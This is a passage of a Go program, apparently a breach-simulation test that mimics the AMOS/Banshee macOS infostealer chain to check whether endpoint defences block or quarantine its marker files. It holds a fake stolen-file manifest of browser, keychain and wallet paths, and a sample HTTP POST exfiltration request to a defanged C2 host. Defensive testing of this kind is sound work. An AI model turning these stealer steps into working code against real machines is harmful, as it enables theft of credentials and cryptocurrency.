  login.keychain-db.dump          [2.1 MB] Chainbreaker keychain extraction
  chrome_safe_storage_key.txt     [0.1 KB] Chrome decryption key

browsers/
  chrome/
    Login Data                    [1.2 MB] Encrypted credentials (SQLite)
    Cookies                       [4.5 MB] Session cookies
    Web Data                      [0.8 MB] Autofill data
    History                       [3.2 MB] Browsing history
    Local State                   [0.1 MB] Browser configuration
  firefox/
    logins.json                   [0.3 MB] Encrypted credentials
    key4.db                       [0.5 MB] NSS key database
    cookies.sqlite                [1.8 MB] Session cookies
  safari/
    Cookies.binarycookies         [0.9 MB] Safari cookies
    History.db                    [2.1 MB] Browsing history

wallets/
  metamask/                       [4.3 MB] MetaMask vault data
  coinbase/                       [2.0 MB] Coinbase Wallet data
  exodus/                         [8.0 MB] Exodus wallet + keystore
  atomic/                         [3.0 MB] Atomic Wallet leveldb
  electrum/                       [1.0 MB] Electrum wallet files

notes/
  NoteStore.sqlite                [12.4 MB] Apple Notes database

system/
  system_info.json                [0.1 MB] Hardware/software info
  stealer_config.json             [0.1 MB] Build configuration

--- Archive Metadata ---
Total Files: 67
Total Uncompressed Size: 48.5 MB
Estimated Compressed Size: 15.2 MB (zip, deflate)
Compression Ratio: 68.6%%
`, time.Now().Format(time.RFC3339))

	manifestPath := filepath.Join(targetDir, "out_zip_manifest.txt")
	if err := os.WriteFile(manifestPath, []byte(archiveManifest), 0644); err != nil {
		return false, fmt.Errorf("failed to write archive manifest: %v", err)
	}
	LogFileDropped("out_zip_manifest.txt", manifestPath, int64(len(archiveManifest)), false)
	Endpoint.Say("    [+] Created exfiltration archive manifest (67 files, ~48.5 MB)")

	// Create a small simulated "out.zip" file (just enough to trigger file detection)
	// This is a simulation marker file, not an actual archive
	simulatedArchiveContent := []byte("PK\x03\x04" + // ZIP magic bytes
		"[F0RT1KA SIMULATION - NOT A REAL ARCHIVE]\n" +
		"This file simulates the 'out.zip' archive created by AMOS Stealer.\n" +
		"Real AMOS creates this archive containing all stolen data before exfiltration.\n" +
		fmt.Sprintf("HWID: %s\n", config.HardwareID) +
		fmt.Sprintf("WID: %s\n", config.WorkerID) +
		fmt.Sprintf("Timestamp: %s\n", time.Now().Format(time.RFC3339)))

	outZipPath := filepath.Join(targetDir, "out.zip")
	if err := os.WriteFile(outZipPath, simulatedArchiveContent, 0644); err != nil {
		return false, fmt.Errorf("failed to write simulated out.zip: %v", err)
	}
	LogFileDropped("out.zip", outZipPath, int64(len(simulatedArchiveContent)), false)
	Endpoint.Say("    [+] Created simulated 'out.zip' staging archive")

	// Simulate HTTP POST exfiltration metadata
	exfilPayload := ExfilPayload{
		ArchiveFile:    "out.zip",
		ArchiveSize:    15938560, // ~15.2 MB simulated
		FilesCollected: 67,
		HardwareID:     config.HardwareID,
		WorkerID:       config.WorkerID,
		Username:       config.Username,
		ExfilMethod:    "HTTP POST multipart/form-data",
		TargetURL:      "http://185.215.113[.]XX/sendlog (DEFANGED - SIMULATION)",
		Timestamp:      time.Now().Format(time.RFC3339),
	}

	exfilJSON, _ := json.MarshalIndent(exfilPayload, "", "  ")
	exfilPath := filepath.Join(targetDir, "exfiltration_metadata.json")
	if err := os.WriteFile(exfilPath, exfilJSON, 0644); err != nil {
		return false, fmt.Errorf("failed to write exfiltration metadata: %v", err)
	}
	LogFileDropped("exfiltration_metadata.json", exfilPath, int64(len(exfilJSON)), false)
	Endpoint.Say("    [+] Generated exfiltration metadata (HTTP POST with hwid/wid/user)")

	// Log the simulated HTTP POST request
	httpPostLog := fmt.Sprintf(`=== AMOS HTTP POST Exfiltration (SIMULATION) ===
Timestamp: %s
Technique: T1041 (Exfiltration Over C2 Channel)

--- HTTP Request ---
POST /sendlog HTTP/1.1
Host: 185.215.113[.]XX (DEFANGED)
Content-Type: multipart/form-data; boundary=----F0RT1KASimBoundary
User-Agent: Mozilla/5.0

------F0RT1KASimBoundary
Content-Disposition: form-data; name="hwid"

%s
------F0RT1KASimBoundary
Content-Disposition: form-data; name="wid"

%s
------F0RT1KASimBoundary
Content-Disposition: form-data; name="user"

%s
------F0RT1KASimBoundary
Content-Disposition: form-data; name="file"; filename="out.zip"
Content-Type: application/zip

[BINARY DATA - %d bytes - SIMULATED]
------F0RT1KASimBoundary--

--- Response (Simulated) ---
HTTP/1.1 200 OK
{"status": "received", "id": "%s"}

--- Banshee C2 Variant ---
Protocol: XOR-encrypted HTTP traffic
XOR Key: Rotates per campaign
C2 Server: Different infrastructure per MaaS customer
Price: $3,000/month (MaaS subscription)
`, time.Now().Format(time.RFC3339), config.HardwareID, config.WorkerID,
		config.Username, exfilPayload.ArchiveSize, uuid.New().String()[:8])

	httpPostPath := filepath.Join(targetDir, "exfiltration_http_post.txt")
	if err := os.WriteFile(httpPostPath, []byte(httpPostLog), 0644); err != nil {
		return false, fmt.Errorf("failed to write HTTP POST log: %v", err)
	}
	LogFileDropped("exfiltration_http_post.txt", httpPostPath, int64(len(httpPostLog)), false)
	Endpoint.Say("    [+] Documented HTTP POST exfiltration with metadata fields")

	LogMessage("INFO", "T1560.001/T1041", "Data staging and exfiltration simulation completed")
	return true, nil
}

// ==============================================================================
// UTILITY FUNCTIONS
// ==============================================================================

// xorEncrypt performs XOR encryption/decryption
func xorEncrypt(data, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// generateSimulatedHWID generates a simulated hardware ID
func generateSimulatedHWID() string {
	data := fmt.Sprintf("F0RT1KA-SIM-%d-%s", time.Now().UnixNano(), uuid.New().String())
	hash := sha256.Sum256([]byte(data))
	return hex.EncodeToString(hash[:16])
}

// countKeystores counts wallets with keystores
func countKeystores(wallets []CryptoWalletInfo) int {
	count := 0
	for _, w := range wallets {
		if w.HasKeystore {
			count++
		}
	}
	return count
}

// ==============================================================================
// MAIN TEST FUNCTION
// ==============================================================================

func test() {
	// Phase 0: Initialization
	LogPhaseStart(0, "Initialization")
	Endpoint.Say("[*] Phase 0: Test Initialization")

	targetDir := "/tmp/F0"
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		LogMessage("ERROR", "Initialization", fmt.Sprintf("Failed to create target directory: %v", err))
		LogPhaseEnd(0, "failed", "Failed to create target directory")
		SaveLog(1, fmt.Sprintf("Failed to create directory: %v", err))
		Endpoint.Stop(1)
	}

	// Create simulation artifacts directory at /Users/fortika-test
	// This path is NOT whitelisted, allowing EDR to detect file operations
	simulationDir := "/Users/fortika-test"
	if err := os.MkdirAll(simulationDir, 0755); err != nil {
		LogMessage("WARNING", "Initialization", fmt.Sprintf("Failed to create simulation directory: %v (non-fatal)", err))
		// Fall back to targetDir for artifacts
		simulationDir = targetDir
	}

	LogPhaseEnd(0, "success", "Test environment initialized")
	Endpoint.Say("    [+] Test environment initialized")
	Endpoint.Say("    [+] Artifacts directory: %s", simulationDir)
	Endpoint.Say("")

	// Track which phases were blocked by security controls
	blocked := false
	blockedPhase := ""
	blockedDetail := ""
	totalPhases := 8
	completedPhases := 0

	// Phase 1: osascript Credential Phishing (T1059.002, T1056.002)
	LogPhaseStart(1, "osascript Credential Phishing (T1059.002, T1056.002)")
	Endpoint.Say("[*] Phase 1: osascript Credential Phishing Simulation")
	success, err := simulateOsascriptCredentialPhishing(simulationDir)
	if err != nil {
		LogMessage("ERROR", "T1059.002", fmt.Sprintf("Phase 1 failed: %v", err))
		LogPhaseEnd(1, "error", err.Error())
		blocked = true
		blockedPhase = "Phase 1: osascript Credential Phishing"
		blockedDetail = err.Error()
	} else if !success {
		LogPhaseEnd(1, "blocked", "osascript credential phishing was blocked")
		blocked = true
		blockedPhase = "Phase 1: osascript Credential Phishing"
		blockedDetail = "Security controls prevented osascript execution"
	} else {
		LogPhaseEnd(1, "success", "osascript credential phishing simulation completed")
		completedPhases++
	}
	Endpoint.Say("")

	// Phase 2: dscl Credential Validation (T1059.002)
	if !blocked {
		LogPhaseStart(2, "dscl Credential Validation (T1059.002)")
		Endpoint.Say("[*] Phase 2: dscl Credential Validation Simulation")
		success, err = simulateDsclValidation(simulationDir)
		if err != nil {
			LogMessage("ERROR", "T1059.002", fmt.Sprintf("Phase 2 failed: %v", err))
			LogPhaseEnd(2, "error", err.Error())
			blocked = true
			blockedPhase = "Phase 2: dscl Credential Validation"
			blockedDetail = err.Error()
		} else if !success {
			LogPhaseEnd(2, "blocked", "dscl validation was blocked")
			blocked = true
			blockedPhase = "Phase 2: dscl Credential Validation"
			blockedDetail = "Security controls prevented dscl execution"
		} else {
			LogPhaseEnd(2, "success", "dscl credential validation simulation completed")
			completedPhases++
		}
		Endpoint.Say("")
	}

	// Phase 3: Keychain Credential Dumping via Chainbreaker (T1555.001)
	if !blocked {
		LogPhaseStart(3, "Keychain Credential Dumping via Chainbreaker (T1555.001)")
		Endpoint.Say("[*] Phase 3: Keychain Credential Dumping Simulation")
		success, err = simulateKeychainDumping(simulationDir)
		if err != nil {
			LogMessage("ERROR", "T1555.001", fmt.Sprintf("Phase 3 failed: %v", err))
			LogPhaseEnd(3, "error", err.Error())
			blocked = true
			blockedPhase = "Phase 3: Keychain Credential Dumping"
			blockedDetail = err.Error()
		} else if !success {
			LogPhaseEnd(3, "blocked", "Keychain access was blocked")
			blocked = true
			blockedPhase = "Phase 3: Keychain Credential Dumping"
			blockedDetail = "Keychain access denied by security controls"
		} else {
			LogPhaseEnd(3, "success", "Keychain credential dumping simulation completed")
			completedPhases++
		}
		Endpoint.Say("")
	}

	// Phase 4: Browser Credential Theft (T1005)
	if !blocked {
		LogPhaseStart(4, "Browser Credential Theft (T1005)")
		Endpoint.Say("[*] Phase 4: Browser Credential Theft Simulation")
		success, err = simulateBrowserCredentialTheft(simulationDir)
		if err != nil {
			LogMessage("ERROR", "T1005", fmt.Sprintf("Phase 4 failed: %v", err))
			LogPhaseEnd(4, "error", err.Error())
			blocked = true
			blockedPhase = "Phase 4: Browser Credential Theft"
			blockedDetail = err.Error()
		} else if !success {
			LogPhaseEnd(4, "blocked", "Browser credential access was blocked")
			blocked = true
			blockedPhase = "Phase 4: Browser Credential Theft"
			blockedDetail = "Browser credential access denied"
		} else {
			LogPhaseEnd(4, "success", "Browser credential theft simulation completed")
			completedPhases++
		}
		Endpoint.Say("")
	}

	// Phase 5: Cryptocurrency Wallet Targeting (T1005)
	if !blocked {
		LogPhaseStart(5, "Cryptocurrency Wallet Targeting (T1005)")
		Endpoint.Say("[*] Phase 5: Cryptocurrency Wallet Targeting Simulation")
		success, err = simulateCryptoWalletTargeting(simulationDir)
		if err != nil {
			LogMessage("ERROR", "T1005", fmt.Sprintf("Phase 5 failed: %v", err))
			LogPhaseEnd(5, "error", err.Error())
			blocked = true
			blockedPhase = "Phase 5: Cryptocurrency Wallet Targeting"
			blockedDetail = err.Error()
		} else if !success {
			LogPhaseEnd(5, "blocked", "Wallet access was blocked")
			blocked = true
			blockedPhase = "Phase 5: Cryptocurrency Wallet Targeting"
			blockedDetail = "Wallet data access denied"
		} else {
			LogPhaseEnd(5, "success", "Cryptocurrency wallet targeting simulation completed")
			completedPhases++
		}
		Endpoint.Say("")
	}

	// Phase 6: TCC Reset (Cuckoo pattern)
	if !blocked {
		LogPhaseStart(6, "TCC Database Reset (Cuckoo Pattern)")
		Endpoint.Say("[*] Phase 6: TCC Database Reset Simulation")
		success, err = simulateTCCReset(simulationDir)
		if err != nil {
			LogMessage("ERROR", "TCC Reset", fmt.Sprintf("Phase 6 failed: %v", err))
			LogPhaseEnd(6, "error", err.Error())
			blocked = true
			blockedPhase = "Phase 6: TCC Database Reset"
			blockedDetail = err.Error()
		} else if !success {
			LogPhaseEnd(6, "blocked", "TCC reset was blocked")
			blocked = true
			blockedPhase = "Phase 6: TCC Database Reset"
			blockedDetail = "TCC manipulation prevented"
		} else {
			LogPhaseEnd(6, "success", "TCC reset simulation completed")
			completedPhases++
		}
		Endpoint.Say("")
	}

	// Phase 7: XProtect-style XOR Obfuscation (T1027)
	if !blocked {
		LogPhaseStart(7, "XProtect String Encryption (T1027)")
		Endpoint.Say("[*] Phase 7: XProtect-style XOR Obfuscation Simulation")
		success, err = simulateXORObfuscation(simulationDir)
		if err != nil {
			LogMessage("ERROR", "T1027", fmt.Sprintf("Phase 7 failed: %v", err))
			LogPhaseEnd(7, "error", err.Error())
			blocked = true
			blockedPhase = "Phase 7: XOR Obfuscation"
			blockedDetail = err.Error()
		} else if !success {
			LogPhaseEnd(7, "blocked", "XOR obfuscation was blocked")
			blocked = true
			blockedPhase = "Phase 7: XOR Obfuscation"
			blockedDetail = "Obfuscation technique detected"
		} else {
			LogPhaseEnd(7, "success", "XOR obfuscation simulation completed")
			completedPhases++
		}
		Endpoint.Say("")
	}

	// Phase 8: Data Staging and Exfiltration (T1560.001, T1041)
	if !blocked {
		LogPhaseStart(8, "Data Staging and Exfiltration (T1560.001, T1041)")
		Endpoint.Say("[*] Phase 8: Data Staging and Exfiltration Simulation")
		success, err = simulateDataStagingAndExfiltration(simulationDir)
		if err != nil {
			LogMessage("ERROR", "T1560.001/T1041", fmt.Sprintf("Phase 8 failed: %v", err))
			LogPhaseEnd(8, "error", err.Error())
			blocked = true
			blockedPhase = "Phase 8: Data Staging and Exfiltration"
			blockedDetail = err.Error()
		} else if !success {
			LogPhaseEnd(8, "blocked", "Data exfiltration was blocked")
			blocked = true
			blockedPhase = "Phase 8: Data Staging and Exfiltration"
			blockedDetail = "Exfiltration prevented by security controls"
		} else {
			LogPhaseEnd(8, "success", "Data staging and exfiltration simulation completed")
			completedPhases++
		}
		Endpoint.Say("")
	}

	// ==============================================================================
	// FINAL EVALUATION
	// ==============================================================================

	if blocked {
		Endpoint.Say("=================================================================")
		Endpoint.Say("RESULT: PROTECTED")
		Endpoint.Say("=================================================================")
		Endpoint.Say("")
		Endpoint.Say("Security controls blocked the AMOS/Banshee stealer simulation.")
		Endpoint.Say("")
		Endpoint.Say("Blocked At: %s", blockedPhase)
		Endpoint.Say("Detail: %s", blockedDetail)
		Endpoint.Say("Completed Phases: %d/%d", completedPhases, totalPhases)
		Endpoint.Say("Remaining Phases: %d (not executed)", totalPhases-completedPhases)
		Endpoint.Say("")
		Endpoint.Say("Protection Type: Execution Prevention / Behavioral Block")
		Endpoint.Say("Exit Code: 126")
		Endpoint.Say("=================================================================")
		Endpoint.Say("")

		SaveLog(126, fmt.Sprintf("Blocked at %s: %s", blockedPhase, blockedDetail))
		Endpoint.Stop(126)
	}

	// All phases completed - check for quarantine of key artifacts
	Endpoint.Say("[*] Post-Execution: Checking for defensive reactions...")

	// Check if any key simulation artifacts were quarantined
	keyArtifacts := []string{
		"amos_credential_dialog.applescript",
		"chainbreaker_extraction.txt",
		"extracted_credentials.json",
		"out.zip",
		"exfiltration_metadata.json",
	}

	quarantined := false
	quarantinedFile := ""
	for _, artifact := range keyArtifacts {
		artifactPath := filepath.Join(simulationDir, artifact)
		if _, err := os.Stat(artifactPath); os.IsNotExist(err) {
			// File was removed/quarantined after creation
			quarantined = true
			quarantinedFile = artifact
			LogMessage("INFO", "Quarantine Detection", fmt.Sprintf("Artifact quarantined: %s", artifact))
			break
		}
	}

	if quarantined {
		Endpoint.Say("")
		Endpoint.Say("=================================================================")
		Endpoint.Say("RESULT: PROTECTED")
		Endpoint.Say("=================================================================")
		Endpoint.Say("")
		Endpoint.Say("Security controls detected and quarantined stealer artifacts.")
		Endpoint.Say("")
		Endpoint.Say("Quarantined File: %s", quarantinedFile)
		Endpoint.Say("All Phases Completed: Yes (%d/%d)", completedPhases, totalPhases)
		Endpoint.Say("Post-Execution Detection: Security controls removed artifacts")
		Endpoint.Say("")
		Endpoint.Say("Protection Type: Post-Execution Artifact Quarantine")
		Endpoint.Say("Exit Code: 127")
		Endpoint.Say("=================================================================")
		Endpoint.Say("")

		SaveLog(127, fmt.Sprintf("Artifact quarantined post-execution: %s", quarantinedFile))
		Endpoint.Stop(127)
	}

	// All phases completed and artifacts persist - system is vulnerable
	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("RESULT: UNPROTECTED")
	Endpoint.Say("=================================================================")
	Endpoint.Say("")
	Endpoint.Say("CRITICAL: Complete AMOS/Banshee infostealer chain executed without prevention")
	Endpoint.Say("")
	Endpoint.Say("Attack Chain Summary:")
	Endpoint.Say("  Total Phases: %d", totalPhases)
	Endpoint.Say("  Successful Phases: %d", completedPhases)
	Endpoint.Say("  Blocked Phases: 0")
	Endpoint.Say("")
	Endpoint.Say("Executed Techniques:")
	Endpoint.Say("  Phase 1: T1059.002/T1056.002 - osascript Credential Phishing")
	Endpoint.Say("  Phase 2: T1059.002         - dscl Credential Validation")
	Endpoint.Say("  Phase 3: T1555.001         - Keychain Credential Dumping (Chainbreaker)")
	Endpoint.Say("  Phase 4: T1005             - Browser Credential Theft (9+ browsers)")
	Endpoint.Say("  Phase 5: T1005             - Cryptocurrency Wallet Targeting (8 wallets)")
	Endpoint.Say("  Phase 6: T1059.002         - TCC Database Reset (Cuckoo Pattern)")
	Endpoint.Say("  Phase 7: T1027             - XProtect XOR String Encryption")
	Endpoint.Say("  Phase 8: T1560.001/T1041   - Data Staging + HTTP POST Exfiltration")
	Endpoint.Say("")
	Endpoint.Say("Simulated Data Exfiltration:")
	Endpoint.Say("  Archive: out.zip (15.2 MB simulated)")
	Endpoint.Say("  Files: 67 stolen items")
	Endpoint.Say("  Method: HTTP POST with hwid/wid/user metadata")
	Endpoint.Say("  Target: MaaS C2 infrastructure ($3,000/month)")
	Endpoint.Say("")
	Endpoint.Say("Security Impact: CRITICAL")
	Endpoint.Say("  - Keychain credentials compromised")
	Endpoint.Say("  - Browser passwords across 9+ browsers extracted")
	Endpoint.Say("  - Cryptocurrency wallet data exfiltrated")
	Endpoint.Say("  - Apple Notes with sensitive data stolen")
	Endpoint.Say("  - Session cookies enable account takeover")
	Endpoint.Say("  - XOR evasion bypassed AV signatures")
	Endpoint.Say("")
	Endpoint.Say("IMMEDIATE ACTION REQUIRED")
	Endpoint.Say("=================================================================")
	Endpoint.Say("")

	SaveLog(101, fmt.Sprintf("All %d phases completed - AMOS/Banshee infostealer chain fully successful", totalPhases))
	Endpoint.Stop(101)
}

// ==============================================================================
// CLEANUP UTILITY
// ==============================================================================

func cleanupArtifacts() {
	Endpoint.Say("[*] Cleaning up simulation artifacts...")

	simulationDir := "/Users/fortika-test"
	targetDir := "/tmp/F0"

	// Clean simulation artifacts from /Users/fortika-test
	artifactsToClean := []string{
		"amos_credential_dialog.applescript",
		"osascript_execution_log.txt",
		"pw.dat",
		"dscl_validation_log.txt",
		"keychain_enumeration.txt",
		"chainbreaker_extraction.txt",
		"keychain_entries.json",
		"browser_credential_enumeration.txt",
		"extracted_credentials.json",
		"apple_notes_extraction.txt",
		"crypto_wallet_enumeration.txt",
		"crypto_wallets.json",
		"tcc_reset_log.txt",
		"xor_obfuscation.json",
		"xprotect_evasion_technique.txt",
		"stealer_config.json",
		"out_zip_manifest.txt",
		"out.zip",
		"exfiltration_metadata.json",
		"exfiltration_http_post.txt",
	}

	cleaned := 0
	for _, artifact := range artifactsToClean {
		// Try both directories
		for _, dir := range []string{simulationDir, targetDir} {
			path := filepath.Join(dir, artifact)
			if err := os.Remove(path); err == nil {
				cleaned++
				Endpoint.Say("    [+] Removed: %s", path)
			}
		}
	}

	// Clean up Cuckoo-style hidden directories
	entries, err := os.ReadDir(simulationDir)
	if err == nil {
		for _, entry := range entries {
			if entry.IsDir() && strings.HasPrefix(entry.Name(), ".local-") {
				dirPath := filepath.Join(simulationDir, entry.Name())
				if err := os.RemoveAll(dirPath); err == nil {
					cleaned++
					Endpoint.Say("    [+] Removed hidden dir: %s", dirPath)
				}
			}
		}
	}

	Endpoint.Say("    [+] Cleanup complete: %d artifacts removed", cleaned)
}

// ==============================================================================
// MAIN ENTRY POINT
// ==============================================================================

func main() {
	Endpoint.Say("=================================================================")
	Endpoint.Say("F0RT1KA Security Test: %s", TEST_NAME)
	Endpoint.Say("Test UUID: %s", TEST_UUID)
	Endpoint.Say("Version: %s", VERSION)
	Endpoint.Say("=================================================================")
	Endpoint.Say("")
	Endpoint.Say("Simulates AMOS (Atomic Stealer) and Banshee Stealer credential")
	Endpoint.Say("harvesting techniques targeting macOS endpoints.")
	Endpoint.Say("")
	Endpoint.Say("Threat Intelligence:")
	Endpoint.Say("  - MaaS ecosystem at $3,000/month")
	Endpoint.Say("  - 400%% increase in macOS threats (2023-2024)")
	Endpoint.Say("  - osascript: most abused macOS execution mechanism")
	Endpoint.Say("  - Banshee XProtect evasion: 0/64 VT for 2+ months")
	Endpoint.Say("")

	// Initialize logger with Schema v2.0
	metadata := TestMetadata{
		Version:  VERSION,
		Category: "credential_access",
		Severity: "critical",
		Techniques: []string{
			"T1059.002", // AppleScript
			"T1555.001", // Keychain
			"T1056.002", // GUI Input Capture
			"T1005",     // Data from Local System
			"T1560.001", // Archive Collected Data
			"T1041",     // Exfiltration Over C2
			"T1027",     // Obfuscated Files
		},
		Tactics: []string{
			"execution",
			"credential-access",
			"collection",
			"exfiltration",
			"defense-evasion",
		},
		Score:         9.3,
		RubricVersion: "v1",
		ScoreBreakdown: &ScoreBreakdown{
			RealWorldAccuracy:       2.8,
			TechnicalSophistication: 2.8,
			SafetyMechanisms:        2.0,
			DetectionOpportunities:  0.9,
			LoggingObservability:    0.8,
		},
		Tags: []string{
			"osascript", "keychain-dumping", "credential-phishing",
			"browser-theft", "crypto-wallet", "macos", "infostealer",
			"financial-sector", "xprotect-evasion", "chainbreaker",
			"amos", "banshee", "cuckoo",
		},
	}

	// Resolve organization
	orgInfo := ResolveOrganization("")

	executionContext := ExecutionContext{
		ExecutionID:    uuid.New().String(),
		Organization:   orgInfo.UUID,
		Environment:    "lab",
		DeploymentType: "manual",
		Configuration: &ExecutionConfiguration{
			TimeoutMs:         300000, // 5 minutes
			CertificateMode:   "self-healing",
			MultiStageEnabled: false,
		},
	}

	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)

	Endpoint.Say("Organization: %s", orgInfo.ShortName)
	Endpoint.Say("Execution ID: %s", executionContext.ExecutionID)
	Endpoint.Say("")

	// Panic recovery
	defer func() {
		if r := recover(); r != nil {
			LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
			SaveLog(1, fmt.Sprintf("Test panic: %v", r))
			Endpoint.Stop(1)
		}
	}()

	// Cleanup on completion
	defer cleanupArtifacts()

	// Run test with timeout
	done := make(chan bool, 1)
	go func() {
		test()
		done <- true
	}()

	// 5-minute timeout for multi-phase simulation
	timeout := 5 * time.Minute
	select {
	case <-done:
		Endpoint.Say("Test completed")
	case <-time.After(timeout):
		Endpoint.Say("Test timed out after %v", timeout)
		LogMessage("ERROR", "Test Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
		SaveLog(102, fmt.Sprintf("Test exceeded timeout of %v", timeout))
		Endpoint.Stop(102)
	}
}
